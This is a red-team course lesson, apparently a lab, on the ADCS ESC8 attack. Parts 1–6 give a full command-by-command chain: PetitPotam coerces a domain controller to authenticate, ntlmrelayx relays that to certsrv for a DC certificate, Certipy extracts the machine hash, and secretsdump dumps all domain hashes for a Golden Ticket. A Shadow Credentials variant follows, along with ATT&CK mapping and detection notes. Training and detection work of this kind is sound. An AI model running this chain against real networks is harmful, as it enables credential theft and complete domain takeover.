---
title: "ADCS ESC8 Lab — PetitPotam + NTLM Relay to ADCS for Domain Compromise"
tags: [red-team, ADCS, ESC8, PetitPotam, NTLM-relay, ntlmrelayx, Certipy,
  shadow-credentials, lab, ATT&CK, T1557.001, T1649]
module: 08-RedTeam-03
day: 513
related_topics:
  - ADCS ESC1 Lab (Day 512)
  - Resource-Based Constrained Delegation (Day 514)
  - Lateral Movement Advanced (Day 498)
  - ADCS Attack Surface (Day 511)
---

# Day 513 — ADCS ESC8 Lab: PetitPotam + NTLM Relay

> "ESC8 does not need a misconfigured template. It needs ADCS web enrolment
> to be running — which it is, in most environments, because someone enabled
> it during setup and never thought about it again. Combine it with any
> NTLM coercion technique and you go from network access to Domain Admin
> without touching a single user account."
>
> — Ghost

---

## Goals

Understand ESC8: NTLM relay to ADCS web enrolment (certsrv).
Use PetitPotam to coerce a DC's machine account authentication.
Relay that authentication to certsrv to receive a DC certificate.
Use the DC certificate to perform DCSync-equivalent access.

**Prerequisites:** Day 511 (ADCS concepts), Day 512 (ESC1 lab), Certipy,
ntlmrelayx (Impacket), ADCS web enrolment enabled in lab.
**Time budget:** 4–5 hours.

---

## Part 1 — ESC8 Prerequisite Check

```bash
# Check if ADCS web enrolment is enabled:
# From Kali, check if certsrv HTTP endpoint is accessible:
curl -I http://CA_SERVER/certsrv/

# Response indicating NTLM challenge (vulnerable):
# HTTP/1.1 401 Unauthorized
# WWW-Authenticate: NTLM
# WWW-Authenticate: Negotiate

# If Basic auth only (not NTLM) → ESC8 relay is harder (not covered here)

# From Windows victim:
# Check if ADCS web enrolment is available:
curl http://CA_SERVER/certsrv/certrqxt.asp -UseBasicParsing | Out-Null
# 401 = web enrolment up; confirm NTLM in the authenticate header

# Certipy also reports ESC8:
certipy find -u jsmith@corp.local -p 'Password123' -dc-ip 10.10.10.5
# [!] Vulnerable to ESC8: CA Server accepts NTLM authentication
```

---

## Part 2 — Attack Architecture

```
Attack flow (all three components run simultaneously):

Component 1: ntlmrelayx (relay listener on attacker)
  Listens for incoming NTLM authentication
  Relays it to certsrv endpoint
  Requests a certificate for the authenticating machine account

Component 2: PetitPotam (coerce DC to authenticate)
  Sends an EFS RPC call to the DC
  The DC's machine account (DC01$) authenticates to our attacker listener
  This NTLM authentication is caught by ntlmrelayx

Component 3: Certipy (use the certificate)
  The certificate is for DC01$ (the Domain Controller's machine account)
  Machine account certificates allow requesting TGTs for the machine account
  DC machine account TGT → DCSync-equivalent via secretsdump.py
```

---

## Part 3 — Step 1: Set Up ntlmrelayx

```bash
# On attacker Kali machine:
# Target: the certsrv endpoint on the CA server

# Note: ntlmrelayx and PetitPotam must run simultaneously
# Open two terminal windows or use tmux

# Terminal 1: Start ntlmrelayx pointing to ADCS web enrolment:
python3 ntlmrelayx.py \
    -t http://CA_SERVER/certsrv/certfnsh.asp \
    --adcs \
    --template DomainController \
    -smb2support

# Flags:
# -t: target URL (certsrv certificate request endpoint)
# --adcs: enables ADCS relay mode (requests a certificate instead of LDAP relay)
# --template: use the DomainController template (for DC machine account)
# -smb2support: accept SMB2 relay connections from the DC

# ntlmrelayx is now listening for incoming SMB authentication on 0.0.0.0:445
# It will relay any received NTLM auth to the certsrv endpoint

# Output when ready:
# [*] Protocol Client HTTPS loaded..
# [*] Running in relay mode to single host
# [*] Setting up SMB Server
# [*] Servers started, waiting for connections
```

---

## Part 4 — Step 2: Coerce DC Authentication with PetitPotam

```bash
# Terminal 2: Run PetitPotam to force DC01 to authenticate to attacker:
# PetitPotam abuses the MS-EFSR (Encrypting File System Remote Protocol)
# to trigger an outbound NTLM authentication from the target machine.

python3 PetitPotam.py -u jsmith -p 'Password123' -d corp.local \
    ATTACKER_IP DC01.corp.local

# Flags:
# ATTACKER_IP: where ntlmrelayx is listening (our machine)
# DC01.corp.local: the target to coerce (the Domain Controller)

# What happens:
# PetitPotam sends an EfsRpcOpenFileRaw RPC call to DC01
# DC01 attempts to access the "attacker" path → triggers NTLM auth
# DC01's machine account (DC01$) sends NTLM challenge/response to ATTACKER_IP
# ntlmrelayx catches the NTLM auth and relays it to certsrv

# Expected ntlmrelayx output:
# [*] SMBD-Thread-4: Received connection from DC01_IP, attacking target http://CA_SERVER
# [*] HTTP server returned error code 200, treating as a successful login
# [*] Authenticating against http://CA_SERVER as CORP\DC01$ SUCCEED
# [*] CORP\DC01$ - Getting certificate for 'DC01$' from template 'DomainController'
# [*] Certificate for 'DC01$' saved to 'DC01$.pfx'
```

---

## Part 5 — Step 3: Authenticate with the DC Certificate

```bash
# The certificate is for DC01$ (the Domain Controller's machine account)
# Use Certipy to authenticate and extract the NT hash:

certipy auth -pfx DC01$.pfx -domain corp.local -dc-ip 10.10.10.5

# Output:
# [*] Using principal: dc01$@corp.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'dc01$.ccache'
# [*] Trying to retrieve NT hash for 'dc01$'
# [*] Got hash for 'dc01$@corp.local': aad3b435b51404eeaad3b435b51404ee:DC01_NTLM_HASH

# Now we have:
# dc01$.ccache: TGT for the Domain Controller machine account
# DC01$ NT hash: the machine account NTLM hash
```

---

## Part 6 — Step 4: DCSync Using DC Machine Account

```bash
# A Domain Controller's machine account has DS-Replication-Get-Changes-All
# by default (it needs it to replicate with other DCs).
# Therefore: DC01$ credentials → DCSync rights → all domain hashes.

# Option A: DCSync using the TGT (Kerberos):
export KRB5CCNAME=dc01$.ccache
python3 secretsdump.py -k -no-pass DC01.corp.local
# → Full domain hash dump including krbtgt

# Option B: DCSync using the NT hash (Pass-the-Hash):
python3 secretsdump.py \
    -hashes aad3b435b51404eeaad3b435b51404ee:DC01_NTLM_HASH \
    'CORP/DC01$@DC01.corp.local'
# → Same result: all domain hashes

# Verify domain dominance:
# From the dump: extract krbtgt hash → forge Golden Ticket (Day 499)
# Or: use Administrator hash directly for interactive access
```

---

## Part 7 — Alternative: Shadow Credentials (No Web Enrolment Needed)

If ADCS web enrolment is not present but ADCS is installed:
Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute.

```bash
# Shadow Credentials: add a certificate credential to a target account's
# msDS-KeyCredentialLink attribute (requires GenericWrite on the target)

# Tool: Certipy or Whisker
certipy shadow auto -u jsmith@corp.local -p 'Password123' \
    -account administrator -dc-ip 10.10.10.5

# What it does:
# 1. Generates a key pair
# 2. Adds the public key to Administrator's msDS-KeyCredentialLink
# 3. Uses the private key to authenticate via PKINIT as Administrator
# 4. Returns Administrator TGT + NT hash

# Requires: GenericWrite (or GenericAll) on the target account
# Detection: Event 5136 (msDS-KeyCredentialLink attribute modified)
```

---

## Part 8 — Full Attack Timeline

```
Time    Action                                    Technique
──────────────────────────────────────────────────────────────────────────
T+00    jsmith domain user access confirmed       —
T+01    certipy find: ESC8 confirmed              T1590 (Recon)
T+02    ntlmrelayx started on attacker            T1557.001
T+03    PetitPotam run, DC01$ coerced to auth     T1187 (Forced Auth)
T+04    ntlmrelayx relays to certsrv, cert issued T1649
T+05    certipy auth: DC01$ TGT + NT hash         T1550
T+06    secretsdump: full domain hashes obtained  T1003.006
T+07    krbtgt hash → Golden Ticket forged        T1558.001
Total time: 7 minutes from standard domain user to Domain Admin
No password cracking. No LSASS access. No alert in most SIEMs.
```

---

## ATT&CK Mapping

| Technique | ATT&CK ID | Evidence |
|---|---|---|
| NTLM relay to ADCS | T1557.001 | ntlmrelayx traffic to certsrv |
| Forced authentication (PetitPotam) | T1187 | EFS RPC coercion |
| Certificate abuse | T1649 | DC01$ certificate issued |
| Machine account auth | T1550 | PKINIT TGT for DC01$ |
| DCSync | T1003.006 | Event 4662 from attacker IP |

---

## Key Takeaways

1. ESC8 requires no template misconfiguration — only that certsrv is running
   with NTLM authentication enabled. Default ADCS installation. This is why
   it is so prevalent: the "vulnerability" is the presence of the feature.
2. PetitPotam is the trigger. Any NTLM coercion technique works here
   (PrinterBug, SpoolSample, DFSCoerce). PetitPotam was chosen because it
   works on patched 2022 Server with low-privilege auth (the -u flag).
3. DC machine accounts hold DS-Replication-Get-Changes-All by design. Once
   you have DC01$ credentials, DCSync is immediate. No additional privilege
   escalation is needed.
4. Shadow Credentials is the fallback when web enrolment is absent. It
   requires GenericWrite on the target account but leaves fewer traces than
   NTLM relay (no certsrv IIS logs, no ntlmrelayx traffic).
5. The detection for ESC8 is in certsrv IIS logs: an NTLM-authenticated POST
   to `/certfnsh.asp` from a machine account on behalf of a DC. This is almost
   never alerted on in standard deployments.

---

## Exercises

1. Configure the lab environment with ADCS and web enrolment enabled. Verify
   certsrv is accessible and presents NTLM authentication headers.
2. Execute the full ESC8 chain: ntlmrelayx → PetitPotam → DC01$ cert →
   certipy auth → secretsdump. Record the exact timestamps for each step.
3. Attempt ESC8 after patching PetitPotam: does the PrinterBug coercion method
   work as a replacement? What is the difference in the trigger mechanism?
4. Write a Sigma rule for IIS W3C logs that detects an NTLM-authenticated POST
   to `/certsrv/certfnsh.asp` from a machine account (account name ending in `$`).
   This is the primary detection signal for ESC8.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q513.1, Q513.2 …).

---

## Navigation

← Previous: [Day 512 — ADCS ESC1 Lab](DAY-0512-ADCS-ESC1-Lab.md)
→ Next: [Day 514 — Resource-Based Constrained Delegation](DAY-0514-RBCD-Attack.md)
